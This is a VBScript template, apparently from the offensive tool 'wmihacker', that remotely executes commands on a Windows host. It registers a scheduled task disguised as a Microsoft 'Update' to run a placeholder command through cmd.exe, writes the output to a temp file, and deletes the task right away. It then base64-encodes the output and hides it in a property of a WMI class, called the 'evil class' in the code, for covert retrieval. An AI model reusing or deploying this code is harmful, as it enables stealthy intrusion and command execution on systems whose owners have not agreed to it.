' From wmihacker
Const TriggerTypeDaily = 1
Const ActionTypeExec = 0
Set service = CreateObject("Schedule.Service")
Call service.Connect
Dim rootFolder
Set rootFolder = service.GetFolder("\")
Dim taskDefinition
Set taskDefinition = service.NewTask(0)
Dim regInfo
Set regInfo = taskDefinition.RegistrationInfo
regInfo.Description = "Update"
regInfo.Author = "Microsoft"
Dim settings
Set settings = taskDefinition.settings
settings.Enabled = True
settings.StartWhenAvailable = True
settings.Hidden = False
settings.DisallowStartIfOnBatteries = False
Dim triggers
Set triggers = taskDefinition.triggers
Dim trigger
Set trigger = triggers.Create(7)
Dim Action
Set Action = taskDefinition.Actions.Create(ActionTypeExec)
Action.Path = "c:\windows\system32\cmd.exe"
Action.arguments = chr(34) & "/c REPLEACE_WITH_COMMAND > C:\Windows\Temp\REPLEACE_WITH_FILENAME" & chr(34)
Dim objNet, LoginUser
Set objNet = CreateObject("WScript.Network")
LoginUser = objNet.UserName
If UCase(LoginUser) = "SYSTEM" Then
Else
LoginUser = Empty
End If
Call rootFolder.RegisterTaskDefinition("REPLEACE_WITH_TASK", taskDefinition, 6, LoginUser, , 3)
Call rootFolder.DeleteTask("REPLEACE_WITH_TASK",0)

' Encode result as base64, then load it into evil class
inputFile = "C:\Windows\Temp\REPLEACE_WITH_FILENAME"

Set inStream = CreateObject("ADODB.Stream")
inStream.Open
inStream.type= 1 'TypeBinary
inStream.LoadFromFile(inputFile)
readBytes = inStream.Read()
  
Set oXML = CreateObject("Msxml2.DOMDocument")
Set oNode = oXML.CreateElement("base64")
oNode.dataType = "bin.base64"
oNode.nodeTypedValue = readBytes
Base64Encode = oNode.text

wbemCimtypeString = 8
Set objSWbemService = GetObject("Winmgmts:root\cimv2")
Set objClass = objSWbemService.Get("REPLEACE_WITH_CLASSNAME")

Set objInstance = objClass.spawninstance_
objInstance.CreationClassName = "RELEACE_WITH_UUID"
objInstance.DebugOptions = Base64Encode
objInstance.put_